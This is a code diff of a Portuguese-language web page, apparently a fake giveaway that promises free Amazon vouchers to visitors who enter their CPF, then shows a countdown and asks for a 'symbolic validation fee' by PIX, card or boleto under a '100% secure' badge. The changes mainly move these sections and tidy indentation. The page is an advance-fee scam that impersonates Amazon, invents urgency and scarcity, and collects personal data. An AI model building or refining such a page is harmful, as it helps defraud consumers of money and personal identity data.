@@ -95,80 +95,83 @@
                         <p>Verificando seus dados...</p>
                     </div>
                 </form>
-                
-                <div id="result" class="result-container">
-        <h3 class="result-title">Parabéns! Você atende aos critérios para receber a oferta</h3>
-        <p class="result-warning">Apenas uma oferta por CPF</p>
-        
-        <div class="result-item">
-            <span class="result-label">Nome:</span> <span id="resultNome"></span>
-        </div>
-        <div class="result-item">
-            <span class="result-label">CPF:</span> <span id="resultCpf"></span>
-        </div>
-        <div class="result-item">
-            <span class="result-label">Data de Nascimento:</span> <span id="resultNascimento"></span>
-        </div>
-        <div class="result-item">
-            <span class="result-label">Situação Cadastral:</span> <span id="resultSituacao"></span>
-        </div>
-        
-        <button id="offerBtn" class="btn btn-success" style="margin-top: 20px;">PEGAR OFERTA</button>
-        
-        <div class="countdown" id="countdown">30:00</div>
-        
-        <button id="backBtn" class="btn" style="margin-top: 10px;">Voltar</button>
-    </div>
-    
-    <!-- Nova seção de confirmação de oferta -->
-    <div id="offerConfirmation" class="offer-confirmation">
-        <h2>🎁 Quase lá! Finalize seu resgate</h2>
-        
-        <p>Parabéns! Você está entre os participantes elegíveis para receber o brinde.</p>
-        
-        <p>Para garantir sua oferta com total segurança, é necessário confirmar sua participação com uma taxa simbólica de validação.</p>
-        
-        <div class="highlight">
-            <p><strong>🔒 Essa taxa cobre os custos operacionais da liberação dos vales e garante a entrega segura do benefício, evitando cadastros duplicados ou tentativas de fraude.</strong></p>
-        </div>
-        
-        <h3>Escolha seu método de pagamento:</h3>
-        
-        <div class="payment-options">
-            <div class="payment-option" data-method="pix">
-                <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX">
-                <p>PIX</p>
             </div>
-            <div class="payment-option" data-method="cartao">
-                <img src="https://cdn-icons-png.flaticon.com/512/179/179457.png" alt="Cartão de Crédito">
-                <p>Cartão</p>
-            </div>
-            <div class="payment-option" data-method="boleto">
-                <img src="https://cdn-icons-png.flaticon.com/512/2965/2965300.png" alt="Boleto">
-                <p>Boleto</p>
-            </div>
-        </div>
+        </section>
         
-        <button id="confirmBtn" class="confirm-btn">CONFIRMAR PARTICIPAÇÃO</button>
-        
-        <div class="security-badge">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ecc71" stroke="#2ecc71" stroke-width="2">
-                <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"></path>
-            </svg>
-            Ambiente 100% seguro - Seus dados estão protegidos
-        </div>
-        
-        <p><strong>📝 Após a confirmação:</strong></p>
-        <ul style="text-align: left; margin-left: 20px;">
-            <li>Você receberá um link exclusivo por e-mail e WhatsApp</li>
-            <li>O link leva ao seu vale, que poderá ser usado somente dentro do site da Amazon</li>
-            <li>O crédito é pessoal, intransferível e válido por tempo limitado</li>
-        </ul>
-        
-        <p style="margin-top: 20px;"><strong>📩 Não recebeu o link em até 30 minutos?</strong> Verifique sua caixa de spam ou entre em contato conosco.</p>
-    </div>
+        <!-- Container de Resultado (movido para fora da cpf-section) -->
+        <div id="result" class="result-container">
+            <h3 class="result-title">Parabéns! Você atende aos critérios para receber a oferta</h3>
+            <p class="result-warning">Apenas uma oferta por CPF</p>
             
-        <!-- Seção de Conteúdo -->
+            <div class="result-item">
+                <span class="result-label">Nome:</span> <span id="resultNome"></span>
+            </div>
+            <div class="result-item">
+                <span class="result-label">CPF:</span> <span id="resultCpf"></span>
+            </div>
+            <div class="result-item">
+                <span class="result-label">Data de Nascimento:</span> <span id="resultNascimento"></span>
+            </div>
+            <div class="result-item">
+                <span class="result-label">Situação Cadastral:</span> <span id="resultSituacao"></span>
+            </div>
+            
+            <button id="offerBtn" class="btn btn-success" style="margin-top: 20px;">PEGAR OFERTA</button>
+            
+            <div class="countdown" id="countdown">30:00</div>
+            
+            <button id="backBtn" class="btn" style="margin-top: 10px;">Voltar</button>
+        </div>
+        
+        <!-- Nova seção de confirmação de oferta (também movida para fora) -->
+        <div id="offerConfirmation" class="offer-confirmation">
+            <h2>🎁 Quase lá! Finalize seu resgate</h2>
+            
+            <p>Parabéns! Você está entre os participantes elegíveis para receber o brinde.</p>
+            
+            <p>Para garantir sua oferta com total segurança, é necessário confirmar sua participação com uma taxa simbólica de validação.</p>
+            
+            <div class="highlight">
+                <p><strong>🔒 Essa taxa cobre os custos operacionais da liberação dos vales e garante a entrega segura do benefício, evitando cadastros duplicados ou tentativas de fraude.</strong></p>
+            </div>
+            
+            <h3>Escolha seu método de pagamento:</h3>
+            
+            <div class="payment-options">
+                <div class="payment-option" data-method="pix">
+                    <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX">
+                    <p>PIX</p>
+                </div>
+                <div class="payment-option" data-method="cartao">
+                    <img src="https://cdn-icons-png.flaticon.com/512/179/179457.png" alt="Cartão de Crédito">
+                    <p>Cartão</p>
+                </div>
+                <div class="payment-option" data-method="boleto">
+                    <img src="https://cdn-icons-png.flaticon.com/512/2965/2965300.png" alt="Boleto">
+                    <p>Boleto</p>
+                </div>
+            </div>
+            
+            <button id="confirmBtn" class="confirm-btn">CONFIRMAR PARTICIPAÇÃO</button>
+            
+            <div class="security-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ecc71" stroke="#2ecc71" stroke-width="2">
+                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"></path>
+                </svg>
+                Ambiente 100% seguro - Seus dados estão protegidos
+            </div>
+            
+            <p><strong>📝 Após a confirmação:</strong></p>
+            <ul style="text-align: left; margin-left: 20px;">
+                <li>Você receberá um link exclusivo por e-mail e WhatsApp</li>
+                <li>O link leva ao seu vale, que poderá ser usado somente dentro do site da Amazon</li>
+                <li>O crédito é pessoal, intransferível e válido por tempo limitado</li>
+            </ul>
+            
+            <p style="margin-top: 20px;"><strong>📩 Não recebeu o link em até 30 minutos?</strong> Verifique sua caixa de spam ou entre em contato conosco.</p>
+        </div>
+            
+        <!-- Seção de Conteúdo - Agora visível corretamente -->
         <section class="section">
             <div class="container">
                 <h2>Sobre Nossa Promoção</h2>
@@ -186,7 +189,7 @@
             <p>Estamos oferecendo vales-compras gratuitos para serem usados na plataforma Amazon como um brinde promocional exclusivo.</p>
             
             <p>Os 50 primeiros participantes que atenderem aos critérios poderão resgatar esse benefício.<br>
-        </p>
+            </p>
             
             <h3>Quem pode participar?</h3>
             <p>Para ser elegível, você precisa:</p>
@@ -468,16 +471,11 @@
                     
                     const formattedMinutes = minutes.toString().padStart(2, '0');
                     const formattedSeconds = seconds.toString().padStart(2, '0');
-                     countdownElement.textContent = `${formattedMinutes}:${formattedSeconds}`;
+                    countdownElement.textContent = `${formattedMinutes}:${formattedSeconds}`;
                 }, 1000);
             }
             
-        });
-    
-        document.addEventListener('DOMContentLoaded', function() {
             // Elementos da nova tela
-            const offerBtn = document.getElementById('offerBtn');
-            const result = document.getElementById('result');
             const offerConfirmation = document.getElementById('offerConfirmation');
             const paymentOptions = document.querySelectorAll('.payment-option');
             const confirmBtn = document.getElementById('confirmBtn');
